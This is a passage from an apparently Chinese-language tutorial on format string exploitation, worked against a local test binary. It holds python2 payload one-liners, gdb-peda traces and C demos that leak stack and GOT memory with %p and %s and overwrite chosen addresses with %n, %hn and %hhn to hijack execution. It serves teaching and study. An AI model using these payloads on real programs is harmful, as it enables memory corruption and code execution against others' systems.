.0x1.0x88888888.0xffffffff.0xffe22cfa.0xffe22d04.0x80481fc.0x80484b0.0xf77afa54.0x1.0x424155d0.0x4443.(nil).0x2e0804a0.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025 $ python2 -c 'print(\"\\x10\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out .0x1.0x88888888.0xffffffff.0xffd439ba.0xffd439c4.0x80481fc.0x80484b0.0xf77b6a54.0x1.0x4241c5d0.0x4443.(nil).0x804a010.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e $ python2 -c 'print(\"\\x14\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out .0x1.0x88888888.0xffffffff.0xffcc17aa.0xffcc17b4.0x80481fc.0x80484b0.0xf7746a54.0x1.0x4241c5d0.0x4443.(nil).0x804a014.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e $ python2 -c 'print(\"\\x18\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out \u2592.0x1.0x88888888.0xffffffff.0xffcb99aa.0xffcb99b4.0x80481fc.0x80484b0.0xf775ca54.0x1.0x424125d0.0x4443.(nil).0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e \u7ec6\u5fc3\u4e00\u70b9\u4f60\u5c31\u4f1a\u53d1\u73b0\u7b2c\u4e00\u4e2a\uff08 printf \uff09\u7684\u7ed3\u679c\u6709\u95ee\u9898\u3002\u6211\u4eec\u8f93\u5165\u4e86 \\x0c\\xa0\\x04\\x08 \uff08 0x0804a00c \uff09\uff0c\u53ef\u662f 13 \u53f7\u4f4d\u7f6e\u8f93\u51fa\u7684\u7ed3\u679c\u5374\u662f 0x2e0804a0 \uff0c\u90a3\u4e48\uff0c \\x0c \u54ea\u53bb\u4e86\uff0c\u67e5\u4e86\u4e00\u4e0b ASCII \u8868\uff1a Oct Dec Hex Char \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 014 12 0C FF '\\f' (form feed) \u4e8e\u662f\u5c31\u88ab\u7701\u7565\u4e86\uff0c\u540c\u6837\u4f1a\u88ab\u7701\u7565\u7684\u8fd8\u6709\u5f88\u591a\uff0c\u5982 \\x07 \uff08'\\a'\uff09\u3001 \\x08 \uff08'\\b'\uff09\u3001 \\x20 \uff08SPACE\uff09\u7b49\u7684\u4e0d\u53ef\u89c1\u5b57\u7b26\u90fd\u4f1a\u88ab\u7701\u7565\u3002\u8fd9\u5c31\u4f1a\u8ba9\u6211\u4eec\u540e\u7eed\u7684\u64cd\u4f5c\u51fa\u73b0\u95ee\u9898\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u6700\u540e\u4e00\u4e2a\uff08 __isoc99_scanf \uff09\u3002 $ python2 -c 'print(\"\\x18\\xa0\\x04\\x08\"+\"%13$s\")' > text $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text [----------------------------------registers-----------------------------------] EAX: 0xffffd584 --> 0x804a018 --> 0xf7e3a790 (<__isoc99_scanf>: push ebp) EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd54c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd54c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd550 --> 0xffffd584 --> 0x804a018 --> 0xf7e3a790 (<__isoc99_scanf>: push ebp) 0008| 0xffffd554 --> 0x1 0012| 0xffffd558 --> 0x88888888 0016| 0xffffd55c --> 0xffffffff 0020| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0024| 0xffffd564 --> 0xffffd584 --> 0x804a018 --> 0xf7e3a790 (<__isoc99_scanf>: push ebp) 0028| 0xffffd568 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20w $esp 0xffffd54c: 0x08048520 0xffffd584 0x00000001 0x88888888 0xffffd55c: 0xffffffff 0xffffd57a 0xffffd584 0x080481fc 0xffffd56c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd57c: 0x00004443 0x00000000 0x0804a018 0x24333125 0xffffd58c: 0x00f00073 0xffffd5ca 0x00000001 0x000000c2 gdb-peda$ x/w 0x804a018 0x804a018: 0xf7e3a790 gdb-peda$ c Continuing. \u2592\ufffd\ufffd\ufffd\ufffd \u867d\u7136\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 x/w \u6307\u4ee4\u5f97\u5230 __isoc99_scanf \u51fd\u6570\u7684\u865a\u62df\u5730\u5740 0xf7e3a790 \u3002\u4f46\u662f\u7531\u4e8e 0x804a018 \u5904\u7684\u5185\u5bb9\u662f\u4ecd\u7136\u4e00\u4e2a\u6307\u9488\uff0c\u4f7f\u7528 %13$s \u6253\u5370\u5e76\u4e0d\u6210\u529f\u3002\u5728\u4e0b\u9762\u7684\u5185\u5bb9\u4e2d\u5c06\u4f1a\u4ecb\u7ecd\u600e\u6837\u501f\u52a9 pwntools \u7684\u529b\u91cf\uff0c\u6765\u83b7\u5f97\u6b63\u786e\u683c\u5f0f\u7684\u865a\u62df\u5730\u5740\uff0c\u5e76\u80fd\u591f\u5bf9\u5b83\u6709\u8fdb\u4e00\u6b65\u7684\u5229\u7528\u3002 \u5f53\u7136\u5e76\u975e\u603b\u80fd\u901a\u8fc7\u4f7f\u7528 4 \u5b57\u8282\u7684\u8df3\u8f6c\uff08\u5982 AAAA \uff09\u6765\u6b65\u8fdb\u53c2\u6570\u6307\u9488\u53bb\u5f15\u7528\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u90e8\u5206\uff0c\u6709\u65f6\uff0c\u9700\u8981\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u4e4b\u524d\u52a0\u4e00\u4e2a\u3001\u4e24\u4e2a\u6216\u4e09\u4e2a\u5b57\u7b26\u7684\u524d\u7f00\u6765\u5b9e\u73b0\u4e00\u7cfb\u5217\u7684 \uff14 \u5b57\u8282\u8df3\u8f6c\u3002 \u8986\u76d6\u6808\u5185\u5bb9 \u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u8bfb\u53d6\u6808\u4e0a\u548c\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u4e86\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u66f4\u8fdb\u4e00\u6b65\uff0c\u901a\u8fc7\u4fee\u6539\u6808\u548c\u5185\u5b58\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 %n \u8f6c\u6362\u6307\u793a\u7b26\u5c06 %n \u5f53\u524d\u5df2\u7ecf\u6210\u529f\u5199\u5165\u6d41\u6216\u7f13\u51b2\u533a\u4e2d\u7684\u5b57\u7b26\u4e2a\u6570\u5b58\u50a8\u5230\u5730\u5740\u7531\u53c2\u6570\u6307\u5b9a\u7684\u6574\u6570\u4e2d\u3002 #include<stdio.h> void main() { int i; char str[] = \"hello\"; printf(\"%s %n\\n\", str, &i); printf(\"%d\\n\", i); } $ ./a.out hello 6 i \u88ab\u8d4b\u503c\u4e3a 6\uff0c\u56e0\u4e3a\u5728\u9047\u5230\u8f6c\u6362\u6307\u793a\u7b26\u4e4b\u524d\u4e00\u5171\u5199\u5165\u4e86 6 \u4e2a\u5b57\u7b26\uff08 hello \u52a0\u4e0a\u4e00\u4e2a\u7a7a\u683c\uff09\u3002\u5728\u6ca1\u6709\u957f\u5ea6\u4fee\u9970\u7b26\u65f6\uff0c\u9ed8\u8ba4\u5199\u5165\u4e00\u4e2a int \u7c7b\u578b\u7684\u503c\u3002 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8981\u9700\u8981\u8986\u5199\u7684\u503c\u662f\u4e00\u4e2a shellcode \u7684\u5730\u5740\uff0c\u800c\u8fd9\u4e2a\u5730\u5740\u5f80\u5f80\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6570\u5b57\u3002\u8fd9\u65f6\u6211\u4eec\u5c31\u9700\u8981\u901a\u8fc7\u4f7f\u7528\u5177\u4f53\u7684\u5bbd\u5ea6\u6216\u7cbe\u5ea6\u7684\u8f6c\u6362\u89c4\u8303\u6765\u63a7\u5236\u5199\u5165\u7684\u5b57\u7b26\u4e2a\u6570\uff0c\u5373\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u4e2d\u52a0\u4e0a\u4e00\u4e2a\u5341\u8fdb\u5236\u6574\u6570\u6765\u8868\u793a\u8f93\u51fa\u7684\u6700\u5c0f\u4f4d\u6570\uff0c\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u5927\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6\uff0c\u5219\u6309\u5b9e\u9645\u4f4d\u6570\u8f93\u51fa\uff0c\u53cd\u4e4b\u5219\u4ee5\u7a7a\u683c\u6216 0 \u8865\u9f50\uff08 0 \u8865\u9f50\u65f6\u5728\u5bbd\u5ea6\u524d\u52a0\u70b9 . \u6216 0 \uff09\u3002\u5982\uff1a #include<stdio.h> void main() { int i; printf(\"%10u%n\\n\", 1, &i); printf(\"%d\\n\", i); printf(\"%.50u%n\\n\", 1, &i); printf(\"%d\\n\", i); printf(\"%0100u%n\\n\", 1, &i); printf(\"%d\\n\", i); } $ ./a.out 1 10 00000000000000000000000000000000000000000000000001 50 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 100 \u5c31\u662f\u8fd9\u6837\uff0c\u4e0b\u9762\u6211\u4eec\u628a\u5730\u5740 0x8048000 \u5199\u5165\u5185\u5b58\uff1a printf(\"%0134512640d%n\\n\", 1, &i); $ ./a.out ... 0x8048000 \u8fd8\u662f\u6211\u4eec\u4e00\u5f00\u59cb\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u5c1d\u8bd5\u5c06 arg2 \u7684\u503c\u66f4\u6539\u4e3a\u4efb\u610f\u503c\uff08\u6bd4\u5982 0x00000020 \uff0c\u5341\u8fdb\u5236 32\uff09\uff0c\u5728 gdb \u4e2d\u53ef\u4ee5\u770b\u5230\u5f97\u5230 arg2 \u7684\u5730\u5740 0xffffd538 \uff0c\u90a3\u4e48\u6211\u4eec\u6784\u9020\u683c\u5f0f\u5b57\u7b26\u4e32 \\x38\\xd5\\xff\\xff%08x%08x%012d%13$n \uff0c\u5176\u4e2d \\x38\\xd5\\xff\\xff \u8868\u793a arg2 \u7684\u5730\u5740\uff0c\u5360 4 \u5b57\u8282\uff0c %08x%08x \u8868\u793a\u4e24\u4e2a 8 \u5b57\u7b26\u5bbd\u7684\u5341\u516d\u8fdb\u5236\u6570\uff0c\u5360 16 \u5b57\u8282\uff0c %012d \u5360 12 \u5b57\u8282\uff0c\u4e09\u4e2a\u90e8\u5206\u52a0\u8d77\u6765\u5c31\u5360\u4e86 4+16+12=32 \u5b57\u8282\uff0c\u5373\u628a arg2 \u8d4b\u503c\u4e3a 0x00000020 \u3002\u683c\u5f0f\u5b57\u7b26\u4e32\u6700\u540e\u4e00\u90e8\u5206 %13$n \u4e5f\u662f\u6700\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u548c\u4e0a\u9762\u7684\u5185\u5bb9\u4e00\u6837\uff0c\u8868\u793a\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u7b2c 13 \u4e2a\u53c2\u6570\uff0c\u5373\u5199\u5165 0xffffd538 \u7684\u5730\u65b9\uff08 0xffffd564 \uff09\uff0c printf() \u5c31\u662f\u901a\u8fc7\u8fd9\u4e2a\u5730\u5740\u627e\u5230\u88ab\u8986\u76d6\u7684\u5185\u5bb9\u7684\uff1a $ python2 -c 'print(\"\\x38\\xd5\\xff\\xff%08x%08x%012d%13$n\")' > text $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text [----------------------------------registers-----------------------------------] EAX: 0xffffd564 --> 0xffffd538 --> 0x88888888 EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x88888888 0008| 0xffffd534 --> 0x1 0012| 0xffffd538 --> 0x88888888 0016| 0xffffd53c --> 0xffffffff 0020| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0024| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x88888888 0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20x $esp 0xffffd52c: 0x08048520 0xffffd564 0x00000001 0x88888888 0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564 0x080481fc 0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd55c: 0x00004443 0x00000000 0xffffd538 0x78383025 0xffffd56c: 0x78383025 0x32313025 0x33312564 0x00006e24 gdb-peda$ finish Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 [----------------------------------registers-----------------------------------] EAX: 0x20 (' ') EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x0 EDX: 0xf7f98830 --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ') EIP: 0x8048520 (<main+138>: add esp,0x20) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048514 <main+126>: lea eax,[ebp-0x94] 0x804851a <main+132>: push eax 0x804851b <main+133>: call 0x8048350 <printf@plt> => 0x8048520 <main+138>: add esp,0x20 0x8048523 <main+141>: sub esp,0xc 0x8048526 <main+144>: push 0xa 0x8048528 <main+146>: call 0x8048370 <putchar@plt> 0x804852d <main+151>: add esp,0x10 [------------------------------------stack-------------------------------------] 0000| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ') 0004| 0xffffd534 --> 0x1 0008| 0xffffd538 --> 0x20 (' ') 0012| 0xffffd53c --> 0xffffffff 0016| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0020| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ') 0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8') 0028| 0xffffd54c --> 0x80484b0 (<main+26>: add ebx,0x1b50) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x08048520 in main () gdb-peda$ x/20x $esp 0xffffd530: 0xffffd564 0x00000001 0x00000020 0xffffffff 0xffffd540: 0xffffd55a 0xffffd564 0x080481fc 0x080484b0 0xffffd550: 0xf7ffda54 0x00000001 0x424135d0 0x00004443 0xffffd560: 0x00000000 0xffffd538 0x78383025 0x78383025 0xffffd570: 0x32313025 0x33312564 0x00006e24 0xf7e70240 \u5bf9\u6bd4 printf() \u51fd\u6570\u6267\u884c\u524d\u540e\u7684\u8f93\u51fa\uff0c printf \u9996\u5148\u89e3\u6790 %13$n \u627e\u5230\u83b7\u5f97\u5730\u5740 0xffffd564 \u7684\u503c 0xffffd538 \uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5730\u5740 0xffffd538 \uff0c\u5c06\u5b83\u7684\u503c 0x88888888 \u8986\u76d6\u4e3a 0x00000020 \uff0c\u5c31\u5f97\u5230 arg2=0x00000020 \u3002 \u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58 \u4e5f\u8bb8\u5df2\u7ecf\u6709\u4eba\u53d1\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u4f7f\u7528\u4e0a\u9762\u8986\u76d6\u5185\u5b58\u7684\u65b9\u6cd5\uff0c\u503c\u6700\u5c0f\u53ea\u80fd\u662f 4\uff0c\u56e0\u4e3a\u5355\u5355\u5730\u5740\u5c31\u5360\u53bb\u4e86 4 \u4e2a\u5b57\u8282\u3002\u90a3\u4e48\u6211\u4eec\u600e\u6837\u8986\u76d6\u6bd4 4 \u5c0f\u7684\u503c\u5462\u3002\u5229\u7528\u6574\u6570\u6ea2\u51fa\u662f\u4e00\u4e2a\u65b9\u6cd5\uff0c\u4f46\u662f\u5728\u5b9e\u8df5\u4e2d\u8fd9\u6837\u505a\u57fa\u672c\u90fd\u4e0d\u4f1a\u6210\u529f\u3002\u518d\u60f3\u4e00\u4e0b\uff0c\u524d\u9762\u7684\u8f93\u5165\u4e2d\uff0c\u5730\u5740\u90fd\u4f4d\u4e8e\u683c\u5f0f\u5b57\u7b26\u4e32\u4e4b\u524d\uff0c\u8fd9\u6837\u505a\u771f\u7684\u6709\u5fc5\u8981\u5417\uff0c\u80fd\u5426\u5c06\u5730\u5740\u653e\u5728\u4e2d\u95f4\u3002\u6211\u4eec\u6765\u8bd5\u4e00\u4e0b\uff0c\u4f7f\u7528\u683c\u5f0f\u5b57\u7b26\u4e32 \"AA%15$nA\"+\"\\x38\\xd5\\xff\\xff\" \uff0c\u5f00\u5934\u7684 AA \u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u5373\u5c06\u5730\u5740\u8d4b\u503c\u4e3a 2 \uff0c\u4e2d\u95f4\u662f %15$n \u5360 5 \u4e2a\u5b57\u8282\uff0c\u8fd9\u91cc\u4e0d\u662f %13$n \uff0c\u56e0\u4e3a\u5730\u5740\u88ab\u6211\u4eec\u653e\u5728\u4e86\u540e\u9762\uff0c\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u7b2c 15 \u4e2a\u53c2\u6570\uff0c\u540e\u9762\u8ddf\u4e0a\u4e00\u4e2a A \u5360\u7528\u4e00\u4e2a\u5b57\u8282\u3002\u4e8e\u662f\u524d\u534a\u90e8\u5206\u603b\u5171\u5360\u7528\u4e86 2+5+1=8 \u4e2a\u5b57\u8282\uff0c\u521a\u597d\u662f\u4e24\u4e2a\u53c2\u6570\u7684\u5bbd\u5ea6\uff0c\u8fd9\u91cc\u7684 8 \u5b57\u8282\u5bf9\u9f50\u5341\u5206\u91cd\u8981\u3002\u6700\u540e\u518d\u8f93\u5165\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740 \\x38\\xd5\\xff\\xff \uff0c\u8be6\u7ec6\u8f93\u51fa\u5982\u4e0b\uff1a $ python2 -c 'print(\"AA%15$nA\"+\"\\x38\\xd5\\xff\\xff\")' > text $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text [----------------------------------registers-----------------------------------] EAX: 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd530 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") 0008| 0xffffd534 --> 0x1 0012| 0xffffd538 --> 0x88888888 0016| 0xffffd53c --> 0xffffffff 0020| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0024| 0xffffd544 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") 0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20x $esp 0xffffd52c: 0x08048520 0xffffd564 0x00000001 0x88888888 0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564 0x080481fc 0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd55c: 0x00004443 0x00000000 0x31254141 0x416e2435 0xffffd56c: 0xffffd538 0xffffd500 0x00000001 0x000000c2 gdb-peda$ finish Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 [----------------------------------registers-----------------------------------] EAX: 0x7 EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x0 EDX: 0xf7f98830 --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd530 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") EIP: 0x8048520 (<main+138>: add esp,0x20) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048514 <main+126>: lea eax,[ebp-0x94] 0x804851a <main+132>: push eax 0x804851b <main+133>: call 0x8048350 <printf@plt> => 0x8048520 <main+138>: add esp,0x20 0x8048523 <main+141>: sub esp,0xc 0x8048526 <main+144>: push 0xa 0x8048528 <main+146>: call 0x8048370 <putchar@plt> 0x804852d <main+151>: add esp,0x10 [------------------------------------stack-------------------------------------] 0000| 0xffffd530 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") 0004| 0xffffd534 --> 0x1 0008| 0xffffd538 --> 0x2 0012| 0xffffd53c --> 0xffffffff 0016| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0020| 0xffffd544 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") 0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8') 0028| 0xffffd54c --> 0x80484b0 (<main+26>: add ebx,0x1b50) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x08048520 in main () gdb-peda$ x/20x $esp 0xffffd530: 0xffffd564 0x00000001 0x00000002 0xffffffff 0xffffd540: 0xffffd55a 0xffffd564 0x080481fc 0x080484b0 0xffffd550: 0xf7ffda54 0x00000001 0x424135d0 0x00004443 0xffffd560: 0x00000000 0x31254141 0x416e2435 0xffffd538 0xffffd570: 0xffffd500 0x00000001 0x000000c2 0xf7e70240 \u5bf9\u6bd4 printf() \u51fd\u6570\u6267\u884c\u524d\u540e\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6210\u529f\u5730\u7ed9 arg2 \u8d4b\u503c\u4e86 0x00000002 \u3002 \u8bf4\u5b8c\u4e86\u6570\u5b57\u5c0f\u4e8e 4 \u65f6\u7684\u8986\u76d6\uff0c\u63a5\u4e0b\u6765\u8bf4\u8bf4\u5927\u6570\u5b57\u7684\u8986\u76d6\u3002\u524d\u9762\u7684\u65b9\u6cd5\u6559\u6211\u4eec\u76f4\u63a5\u8f93\u5165\u4e00\u4e2a\u5730\u5740\u7684\u5341\u8fdb\u5236\u5c31\u53ef\u4ee5\u8fdb\u884c\u8d4b\u503c\uff0c\u53ef\u662f\uff0c\u8fd9\u6837\u5360\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u592a\u5927\uff0c\u5f80\u5f80\u4f1a\u8986\u76d6\u6389\u5176\u4ed6\u91cd\u8981\u7684\u5730\u5740\u800c\u4ea7\u751f\u9519\u8bef\u3002\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u957f\u5ea6\u4fee\u9970\u7b26\u6765\u66f4\u6539\u5199\u5165\u7684\u503c\u7684\u5927\u5c0f\uff1a char c; short s; int i; long l; long long ll; printf(\"%s %hhn\\n\", str, &c); // \u5199\u5165\u5355\u5b57\u8282 printf(\"%s %hn\\n\", str, &s); // \u5199\u5165\u53cc\u5b57\u8282 printf(\"%s %n\\n\", str, &i); // \u5199\u51654\u5b57\u8282 printf(\"%s %ln\\n\", str, &l); // \u5199\u51658\u5b57\u8282 printf(\"%s %lln\\n\", str, &ll); // \u5199\u516516\u5b57\u8282 \u8bd5\u4e00\u4e0b\uff1a $ python2 -c 'print(\"A%15$hhn\"+\"\\x38\\xd5\\xff\\xff\")' > text 0xffffd530: 0xffffd564 0x00000001 0x88888801 0xffffffff $ python2 -c 'print(\"A%15$hnA\"+\"\\x38\\xd5\\xff\\xff\")' > text 0xffffd530: 0xffffd564 0x00000001 0x88880001 0xffffffff $ python2 -c 'print(\"A%15$nAA\"+\"\\x38\\xd5\\xff\\xff\")' > text 0xffffd530: 0xffffd564 0x00000001 0x00000001 0xffffffff \u4e8e\u662f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u9010\u5b57\u8282\u5730\u8986\u76d6\uff0c\u4ece\u800c\u5927\u5927\u8282\u7701\u4e86\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u91cc\u6211\u4eec\u5c1d\u8bd5\u5199\u5165 0x12345678 \u5230\u5730\u5740 0xffffd538 \uff0c\u9996\u5148\u4f7f\u7528 AAAABBBBCCCCDDDD \u4f5c\u4e3a\u8f93\u5165\uff1a gdb-peda$ r AAAABBBBCCCCDDDD [----------------------------------registers-----------------------------------] EAX: 0xffffd564 (\"AAAABBBBCCCCDDDD\") EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd530 --> 0xffffd564 (\"AAAABBBBCCCCDDDD\") 0008| 0xffffd534 --> 0x1 0012| 0xffffd538 --> 0x88888888 0016| 0xffffd53c --> 0xffffffff 0020| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0024| 0xffffd544 --> 0xffffd564 (\"AAAABBBBCCCCDDDD\") 0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20x $esp 0xffffd52c: 0x08048520 0xffffd564 0x00000001 0x88888888 0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564 0x080481fc 0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 